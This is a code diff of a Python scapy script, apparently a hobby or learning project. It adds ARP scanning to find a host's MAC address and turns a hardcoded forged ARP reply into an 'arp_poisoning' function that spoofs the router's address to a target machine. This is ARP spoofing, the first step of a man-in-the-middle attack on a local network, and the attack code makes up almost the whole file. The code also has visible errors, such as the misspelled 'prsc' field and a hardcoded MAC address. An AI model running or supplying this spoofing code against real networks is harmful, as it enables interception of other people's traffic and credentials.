@@ -1,9 +1,24 @@
 import scapy.all as scapy
 
+# Scan the network for ARP Request
+def get_mac_address(ip_range):
+    # i) ARP Request
+    arp_request_packet = scapy.ARP(pdst=ip_range)
+    #scapy.ls(scapy.ARP())
+    # ii) Broadcast Request
+    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    #scapy.ls(scapy.Ether())
 
-## Setting Target IP Address and MAC Address and the Router IP
-arp_response = scapy.ARP(op=2,pdst="10.0.2.15",hwdst="08:00:27:bb:99:ed",prsc="10.0.2.1")
-scapy.send(arp_response)
-# scapy.ls(scapy.ARP())
+    # Combining Requests
+    combined_packet = broadcast_packet/arp_request_packet
+    answered_list = scapy.srp(combined_packet, timeout=1)[0]
 
+    return answered_list[0][1].hwsrc
 
+## Spoofing Target IP Address and MAC Address with the Router
+def arp_poisoning(target_ip, poisoned_ip):
+    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst="08:00:27:bb:99:ed",prsc=poisoned_ip)
+    scapy.send(arp_response)
+    # scapy.ls(scapy.ARP())
+
+get_mac_address("10.0.0.1")
